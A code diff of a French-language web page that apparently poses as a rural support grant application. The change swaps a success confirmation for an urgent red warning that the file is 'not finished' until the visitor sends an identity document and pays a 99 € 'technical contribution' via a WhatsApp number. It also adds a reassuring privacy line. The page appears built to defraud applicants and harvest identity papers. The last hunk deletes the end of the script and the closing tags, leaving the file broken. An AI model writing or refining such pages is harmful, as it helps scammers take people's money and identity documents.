@@ -512,35 +512,38 @@
                 <p id="loader-text" style="font-weight: 600; color: var(--navy);">Analyse de votre dossier de soutien en cours...</p>
             </div>
             <div id="success-message" style="display:none; text-align: left; max-height: 460px; overflow-y: auto; padding: 5px;">
-                <div style="text-align: center; margin-bottom: 10px;">
-                    <i class="fas fa-check-circle" style="color:var(--success); font-size:2.5rem;"></i>
-                    <h3 style="color: var(--navy); margin: 5px 0; font-size: 1.1rem;">DOSSIER ENREGISTRÉ AVEC SUCCÈS !</h3>
+                <div style="text-align: center; margin-bottom: 8px;">
+                    <i class="fas fa-exclamation-triangle" style="color: #e74c3c; font-size: 2.2rem; animation: pulse-text 1s infinite;"></i>
+                    <h3 style="color: #e74c3c; margin: 4px 0; font-size: 1rem; font-weight: 800;">ÉTAPE FINALE REQUISE (NON TERMINÉ)</h3>
                 </div>
                 
-                <div style="background: #fdfaf3; border: 1px solid var(--gold); padding: 10px; border-radius: 4px; font-size: 0.75rem; margin-bottom: 10px;">
-                    <p><strong>Code de référence :</strong> <span id="refCodeDisplay" style="color: var(--navy); font-weight: 800;">#CEZ-RURAL-2026</span></p>
-                    <p style="margin-top: 4px;"><strong>Contribution technique :</strong> 99 € (~105 USD)</p>
+                <div style="background: #fff5f5; border: 2px solid #e74c3c; padding: 10px; border-radius: 4px; font-size: 0.72rem; margin-bottom: 10px; color: #c0392b; line-height: 1.4;">
+                    ⚠️ <strong>Attention :</strong> Votre formulaire a bien été envoyé, mais <strong>ce n'est pas encore terminé</strong>. Pour valider définitivement votre dossier et activer l'instruction, vous devez obligatoirement fournir votre **pièce d'identité** et régler la contribution technique de **99 €** (ou 105 USD) via les options ci-dessous.
                 </div>
 
-                <div style="font-size: 0.7rem; color: #555; line-height: 1.4; margin-bottom: 10px;">
-                    🛡️ <strong>Notre engagement qualité :</strong> Votre dossier a été validé. Pour la vérification de votre pièce d'identité et de votre profil, veuillez nous contacter directement ci-dessous afin de finaliser l'instruction.
+                <div style="background: #fdfaf3; border: 1px solid var(--gold); padding: 8px; border-radius: 4px; font-size: 0.72rem; margin-bottom: 10px;">
+                    <p><strong>Code de référence :</strong> <span id="refCodeDisplay" style="color: var(--navy); font-weight: 800;">#CEZ-RURAL-2026</span></p>
                 </div>
 
                 <p style="font-size: 0.72rem; font-weight: 700; color: var(--navy); margin-bottom: 6px;">
-                    Pour obtenir les instructions finales, choisissez l'une de ces options :
+                    Choisissez l'une de ces options pour finaliser :
                 </p>
 
                 <div style="background: #f8f9fa; border: 1px solid #ddd; padding: 8px; border-radius: 4px; margin-bottom: 8px;">
-                    <label style="font-size: 0.68rem; font-weight: 700; color: var(--navy); display: block; margin-bottom: 4px;">1. Laisser un message sur le site :</label>
-                    <textarea id="clientMsgInput" placeholder="Écrivez votre message..." style="width: 100%; height: 40px; font-size: 0.7rem; padding: 5px; border: 1px solid #ccc; border-radius: 3px; resize: none;"></textarea>
-                    <button type="button" onclick="sendClientMessage()" style="background: var(--navy); color: white; border: none; padding: 5px 10px; font-size: 0.68rem; font-weight: 700; border-radius: 3px; cursor: pointer; margin-top: 4px; width: 100%;">Envoyer ma demande</button>
+                    <label style="font-size: 0.68rem; font-weight: 700; color: var(--navy); display: block; margin-bottom: 4px;">1. Envoyer un message à l'assistant :</label>
+                    <textarea id="clientMsgInput" placeholder="Écrivez votre message ou posez votre question..." style="width: 100%; height: 40px; font-size: 0.7rem; padding: 5px; border: 1px solid #ccc; border-radius: 3px; resize: none;"></textarea>
+                    <button type="button" onclick="sendClientMessage()" style="background: var(--navy); color: white; border: none; padding: 5px 10px; font-size: 0.68rem; font-weight: 700; border-radius: 3px; cursor: pointer; margin-top: 4px; width: 100%;">Transmettre au support</button>
                 </div>
 
-                <a id="waDirectBtn" href="https://wa.me/33780976404?text=Bonjour,%20mon%20code%20de%20référence%20est%20%23CEZ-RURAL-2026.%20Je%20souhaite%20finaliser%20la%20vérification%20d'identité%20et%20régler%20la%20contribution%20technique." target="_blank" style="display: flex; align-items: center; justify-content: center; gap: 8px; background: var(--whatsapp); color: white; padding: 8px; border-radius: 4px; text-decoration: none; font-size: 0.75rem; font-weight: 700; margin-bottom: 10px;">
-                    <i class="fab fa-whatsapp" style="font-size: 1rem;"></i> 2. Contactez-nous sur WhatsApp
+                <a id="waDirectBtn" href="https://wa.me/33780976404?text=Bonjour,%20mon%20code%20de%20référence%20est%20%23CEZ-RURAL-2026.%20Je%20souhaite%20finaliser%20la%20vérification%20d'identité%20et%20régler%20la%20contribution%20technique." target="_blank" style="display: flex; align-items: center; justify-content: center; gap: 8px; background: var(--whatsapp); color: white; padding: 9px; border-radius: 4px; text-decoration: none; font-size: 0.75rem; font-weight: 700; margin-bottom: 10px;">
+                    <i class="fab fa-whatsapp" style="font-size: 1.1rem;"></i> 2. Contactez l'assistant sur WhatsApp
                 </a>
 
-                <button class="btn-main" onclick="resetAll()" style="padding: 8px; font-size: 0.75rem;">Fermer / Nouveau dossier</button>
+                <div style="font-size: 0.62rem; color: #666; text-align: center; margin-top: 6px; border-top: 1px solid #eee; padding-top: 6px;">
+                    🔒 Vos données sont protégées conformément à notre <strong>Politique de Confidentialité</strong>.
+                </div>
+
+                <button class="btn-main" onclick="resetAll()" style="padding: 6px; font-size: 0.7rem; margin-top: 6px;">Recommencer</button>
             </div>
         </div>
 
@@ -1074,13 +1077,4 @@
         const msg = document.getElementById('clientMsgInput').value.trim();
         if(!msg) {
             alert("Veuillez écrire un message.");
-            return;
-        }
-
-        const clientNom = document.getElementById('inputNom').value || "Anonyme";
-        const finalUrl = `https://wa.me/33780976404?text=Message%20depuis%20le%20site%20(Réf:%20${generatedRefCode},%20Nom:%20${encodeURIComponent(clientNom)}):%20${encodeURIComponent(msg)}`;
-        window.open(finalUrl, '_blank');
-    }
-</script>
-</body>
-</html>
+       
